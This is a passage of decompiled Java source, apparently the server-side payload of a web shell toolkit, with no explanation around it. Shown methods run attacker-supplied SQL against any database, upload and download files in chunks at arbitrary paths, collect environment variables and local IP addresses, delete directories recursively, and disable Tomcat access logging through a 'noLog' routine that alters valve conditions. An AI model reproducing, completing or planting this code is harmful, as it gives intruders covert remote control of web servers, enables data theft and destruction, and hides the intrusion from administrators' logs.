                        statement.close();
                        dbConn.close();
                        return ("Query OK, " + affectedNum + " rows affected").getBytes();
                    }
                    catch (Exception e) {
                        return e.getMessage().getBytes();
                    }
                }
                return ("no " + dbType + " Dbtype").getBytes();
            }
            catch (Exception e2) {
                return e2.getMessage().getBytes();
            }
        }
        return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
    }

    public byte[] close() {
        try {
            if (this.httpSession != null) {
                this.getMethodAndInvoke(this.httpSession, "invalidate", null, null);
            }
            return "ok".getBytes();
        }
        catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] bigFileUpload() {
        final String fileName = this.get("fileName");
        final byte[] fileContents = this.getByteArray("fileContents");
        final String position = this.get("position");
        try {
            if (position == null) {
                final FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
                fileOutputStream.write(fileContents);
                fileOutputStream.flush();
                fileOutputStream.close();
            }
            else {
                final RandomAccessFile fileOutputStream2 = new RandomAccessFile(fileName, "rw");
                fileOutputStream2.seek(Integer.parseInt(position));
                fileOutputStream2.write(fileContents);
                fileOutputStream2.close();
            }
            return "ok".getBytes();
        }
        catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        final String fileName = this.get("fileName");
        final String mode = this.get("mode");
        final String readByteNumString = this.get("readByteNum");
        final String positionString = this.get("position");
        try {
            if ("fileSize".equals(mode)) {
                return String.valueOf(new File(fileName).length()).getBytes();
            }
            if (!"read".equals(mode)) {
                return "no mode".getBytes();
            }
            final int position = Integer.valueOf(positionString);
            final int readByteNum = Integer.valueOf(readByteNumString);
            final byte[] readData = new byte[readByteNum];
            final FileInputStream fileInputStream = new FileInputStream(fileName);
            fileInputStream.skip(position);
            final int readNum = fileInputStream.read(readData);
            fileInputStream.close();
            if (readNum == readData.length) {
                return readData;
            }
            return copyOf(readData, readNum);
        }
        catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public static byte[] copyOf(final byte[] original, final int newLength) {
        final byte[] arrayOfByte = new byte[newLength];
        System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
        return arrayOfByte;
    }

    public Map getEnv() {
        try {
            final int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion >= 5) {
                try {
                    Class class$6;
                    if ((class$6 = payload.class$6) == null) {
                        try {
                            class$6 = (payload.class$6 = Class.forName("java.lang.System"));
                        }
                        catch (ClassNotFoundException ex) {
                            throw new NoClassDefFoundError(ex.getMessage());
                        }
                    }
                    final Method method = class$6.getMethod("getenv", (Class[])new Class[0]);
                    if (method != null) {
                        final Class<?> returnType = method.getReturnType();
                        Class class$7;
                        if ((class$7 = payload.class$7) == null) {
                            try {
                                class$7 = (payload.class$7 = Class.forName("java.util.Map"));
                            }
                            catch (ClassNotFoundException ex2) {
                                throw new NoClassDefFoundError(ex2.getMessage());
                            }
                        }
                        if (returnType.isAssignableFrom(class$7)) {
                            return (Map)method.invoke(null, (Object[])null);
                        }
                    }
                    return null;
                }
                catch (Exception e) {
                    return null;
                }
            }
            return null;
        }
        catch (Exception e2) {
            return null;
        }
    }

    public String getDocBase() {
        try {
            return this.getRealPath();
        }
        catch (Exception e) {
            return e.getMessage();
        }
    }

    public static Connection getConnection(final String url, final String userName, final String password) {
        Connection connection = null;
        try {
            Class class$8;
            if ((class$8 = payload.class$8) == null) {
                try {
                    class$8 = (payload.class$8 = Class.forName("java.sql.DriverManager"));
                }
                catch (ClassNotFoundException ex) {
                    throw new NoClassDefFoundError(ex.getMessage());
                }
            }
            final Field[] fields = class$8.getDeclaredFields();
            Field field = null;
            for (int i = 0; i < fields.length; ++i) {
                field = fields[i];
                if (field.getName().indexOf("rivers") != -1) {
                    Class class$9;
                    if ((class$9 = payload.class$9) == null) {
                        try {
                            class$9 = (payload.class$9 = Class.forName("java.util.List"));
                        }
                        catch (ClassNotFoundException ex2) {
                            throw new NoClassDefFoundError(ex2.getMessage());
                        }
                    }
                    if (class$9.isAssignableFrom(field.getType())) {
                        break;
                    }
                }
                field = null;
            }
            if (field != null) {
                field.setAccessible(true);
                final List drivers = (List)field.get(null);
                final Iterator iterator = drivers.iterator();
                while (iterator.hasNext()) {
                    if (connection != null) {
                        break;
                    }
                    try {
                        final Object object = iterator.next();
                        Driver driver = null;
                        Class class$10;
                        if ((class$10 = payload.class$10) == null) {
                            try {
                                class$10 = (payload.class$10 = Class.forName("java.sql.Driver"));
                            }
                            catch (ClassNotFoundException ex3) {
                                throw new NoClassDefFoundError(ex3.getMessage());
                            }
                        }
                        if (!class$10.isAssignableFrom(object.getClass())) {
                            final Field[] driverInfos = object.getClass().getDeclaredFields();
                            for (int j = 0; j < driverInfos.length; ++j) {
                                Class class$11;
                                if ((class$11 = payload.class$10) == null) {
                                    try {
                                        class$11 = (payload.class$10 = Class.forName("java.sql.Driver"));
                                    }
                                    catch (ClassNotFoundException ex4) {
                                        throw new NoClassDefFoundError(ex4.getMessage());
                                    }
                                }
                                if (class$11.isAssignableFrom(driverInfos[j].getType())) {
                                    driverInfos[j].setAccessible(true);
                                    driver = (Driver)driverInfos[j].get(object);
                                    break;
                                }
                            }
                        }
                        if (driver == null) {
                            continue;
                        }
                        final Properties properties = new Properties();
                        if (userName != null) {
                            properties.put("user", userName);
                        }
                        if (password != null) {
                            properties.put("password", password);
                        }
                        connection = driver.connect(url, properties);
                    }
                    catch (Exception ex5) {}
                }
            }
        }
        catch (Exception ex6) {}
        return connection;
    }

    public static String getLocalIPList() {
        final List ipList = new ArrayList();
        try {
            final Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                final NetworkInterface networkInterface = (NetworkInterface) networkInterfaces.nextElement();
                final Enumeration inetAddresses = networkInterface.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    final InetAddress inetAddress = (InetAddress) inetAddresses.nextElement();
                    if (inetAddress != null) {
                        final String ip = inetAddress.getHostAddress();
                        ipList.add(ip);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return Arrays.toString(ipList.toArray());
    }

    public String getRealPath() {
        try {
            if (this.servletContext == null) {
                return "servletContext is Null";
            }
            final Class<?> class1 = this.servletContext.getClass();
            final String methodName = "getRealPath";
            final Class[] parameters = { null };
            final int n = 0;
            Class class$2;
            if ((class$2 = payload.class$2) == null) {
                try {
                    class$2 = (payload.class$2 = Class.forName("java.lang.String"));
                }
                catch (ClassNotFoundException ex) {
                    throw new NoClassDefFoundError(ex.getMessage());
                }
            }
            parameters[n] = class$2;
            final Method getRealPathMethod = this.getMethodByClass(class1, methodName, parameters);
            if (getRealPathMethod == null) {
                return "no method getRealPathMethod";
            }
            final Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
            if (retObject != null) {
                return retObject.toString();
            }
            return "Null";
        }
        catch (Exception e) {
            return e.getMessage();
        }
    }

    public void deleteFiles(final File f) throws Exception {
        if (f.isDirectory()) {
            final File[] x = f.listFiles();
            for (int i = 0; i < x.length; ++i) {
                final File fs = x[i];
                this.deleteFiles(fs);
            }
        }
        f.delete();
    }

    Object invoke(final Object obj, final String methodName, final Object[] parameters) {
        try {
            final ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    final Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    }
                    else {
                        classes.add(null);
                    }
                }
            }
            final Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        }
        catch (Exception ex) {
            return null;
        }
    }

    Object getMethodAndInvoke(final Object obj, final String methodName, final Class[] parameterClass, final Object[] parameters) {
        try {
            final Method method = this.getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null) {
                return method.invoke(obj, parameters);
            }
        }
        catch (Exception ex) {}
        return null;
    }

    Method getMethodByClass(Class cs, final String methodName, final Class[] parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, (Class[])parameters);
                method.setAccessible(true);
                cs = null;
            }
            catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        }
        else {
            final Method method = null;
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                }
                catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    private void noLog(final Object servletContext) {
        try {
            final Object applicationContext = getFieldValue(servletContext, "context");
            Object container = getFieldValue(applicationContext, "context");
            final ArrayList arrayList = new ArrayList();
            while (container != null) {
                arrayList.add(container);
                container = this.invoke(container, "getParent", null);
            }
            for (int i = 0; i < arrayList.size(); ++i) {
                try {
                    final Object pipeline = this.invoke(arrayList.get(i), "getPipeline", null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", null);
                        while (valve != null) {
                            if (this.getMethodByClass(valve.getClass(), "getCondition", null) != null) {
                                final Class<?> class1 = valve.getClass();
                                final String methodName = "setCondition";
                                final Class[] parameters = { null };
                                final int n = 0;
                                Class class$2;
                                if ((class$2 = payload.class$2) == null) {
                                    try {
                                        class$2 = (payload.class$2 = Class.forName("java.lang.String"));
                                    }
                                    catch (ClassNotFoundException ex) {
                                        throw new NoClassDefFoundError(ex.getMessage());
                                    }
                                }
                                parameters[n] = class$2;
                                if (this.getMethodByClass(class1, methodName, parameters) != null) {
                                    String condition = (String)this.invoke(valve, "getCondition", new Object[0]);
                                    condition = ((condition == null) ? "FuckLog" : condition);
                                    this.invoke(valve, "setCondition", new Object[] { condition });
                                    final Class<?> class2 = this.servletRequest.getClass();
                                    final String methodName2 = "setAttribute";
                                    final Class[] parameters2 = new Class[2];
                                    final int n2 = 0;
                                    Class class$3;
                                    if ((class$3 = payload.class$2) == null) {
                                        try {
                                            class$3 = (payload.class$2 = Class.forName("java.lang.String"));
                                        }
                                        catch (ClassNotFoundException ex2) {
                                            throw new NoClassDefFoundError(ex2.getMessage());
                                        }
                                    }
                                    parameters2[n2] = class$3;
                                    final int n3 = 1;
                                    Class class$4;
                                    if ((class$4 = payload.class$2) == null) {
                                        try {
                                            class$4 = (payload.class$2 = Class.forName("java.lang.String"));
                                        }
                                        catch (ClassNotFoundException ex3) {
                                            throw new NoClassDefFoundError(ex3.getMessage());
                                        }
                                    }
                                    parameters2[n3] = class$4;
                                    final Method setAttributeMethod = this.getMethodByClass(class2, methodName2, parameters2);
                                    setAttributeMethod.invoke(condition, condition);
                                    valve = this.invoke(valve, "getNext", null);
                                    continue;
                                }
                            }
                            if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                valve = this.invoke(valve, "getNext", null);
                            }
                            else {
                                valve = null;
                            }
                        }
                    }
                }
                catch (Exception ex4) {}
            }
        }
        catch (Exception ex5) {}
    }

    private static Class getClass(final String name) {
        try {
            return Class.forName(name);
        }
        catch (Exception e) {
            return null;
        }
    }

    public static int bytesToInt(final byte[] bytes) {
        final int i = (bytes[0] & 0xFF) | (bytes[1] & 0xFF) << 8 | (bytes[2] & 0xFF) << 16 | (bytes[3] & 0xFF) << 24;
        return i;
    }

    public String base64Encode(final String data) {
        return base64Encode(data.getBytes());
    }

    public static String base64Encode(final byte[] src) {
        final int off = 0;
        final int end = src.length;
        final byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        final int linemax = -1;
        final boolean doPadding = true;
        final char[] base64 = payload.toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        final int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }
        int dp = 0;
        while (sp < sl) {
            final int sl2 = Math.min(sp + slen, sl);
            int bits;
            for (int sp2 = sp, dp2 = dp; sp2 < sl2; bits = ((src[sp2++] & 0xFF) << 16 | (src[sp2++] & 0xFF) << 8 | (src[sp2++] & 0xFF)), dst[dp2++] = (byte)base64[bits >>> 18 & 0x3F], dst[dp2++] = (byte)base64[bits >>> 12 & 0x3F], dst[dp2++] = (byte)base64[bits >>> 6 & 0x3F], dst[dp2++] = (byte)base64[bits & 0x3F]) {}
            final int dlen = (sl2 - sp) / 3 * 4;
            dp += dlen;
            sp = sl2;
        }
        if (sp < end) {
            final int b0 = src[sp++] & 0xFF;
            dst[dp++] = (byte)base64[b0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[b0 << 4 & 0x3F];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            }
            else {
                final int b2 = src[sp++] & 0xFF;
                dst[dp++] = (byte)base64[(b0 << 4 & 0x3F) | b2 >> 4];
                dst[dp++] = (byte)base64[b2 << 2 & 0x3F];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }
        return new String(dst);
    }

    public static byte[] base64Decode(final String base64Str) {
        if (base64Str.length() == 0) {
            return new byte[0];
        }
        final byte[] src = base64Str.getBytes();
        int sp = 0;
        final int sl = src.length;
        int paddings = 0;
        final int len = sl - sp;
        if (src[sl - 1] == 61) {
            ++paddings;
            if (src[sl - 2] == 61) {
                ++paddings;
            }
        }
        if (paddings == 0 && (len & 0x3) != 0x0) {
            paddings = 4 - (len & 0x3);
        }
        byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
        final int[] base64 = new int[256];
        Arrays.fill(base64, -1);
        for (int i = 0; i < payload.toBase64.length; ++i) {
            base64[payload.toBase64[i]] = i;
        }
        base64[61] = -2;
        int dp = 0;
        int bits = 0;
        int shiftto = 18;
        while (sp < sl) {
            int b = src[sp++] & 0xFF;
            if ((b = base64[b]) < 0 && b == -2) {
                if ((shiftto == 6 && (sp == sl || src[sp++] != 61)) || shiftto == 18) {
                    throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
                }
                break;
            }
            else {
                bits |= b << shiftto;
                shiftto -= 6;
                if (shiftto >= 0) {
                    continue;
                }
                dst[dp++] = (byte)(bits >> 16);
                dst[dp++] = (byte)(bits >> 8);
                dst[dp++] = (byte)bits;
                shiftto = 18;
                bits = 0;
            }
        }
        if (shiftto == 6) {
            dst[dp++] = (byte)(bits >> 16);
        }
        else if (shiftto == 0) {
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
        }
        else if (shiftto == 12) {
            throw new IllegalArgumentException("Last unit does not have enough valid bits");
        }
        if (dp != dst.length) {
            final byte[] arrayOfByte = new byte[dp];
            System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
            dst = arrayOfByte;
        }
        return dst;
    }
}
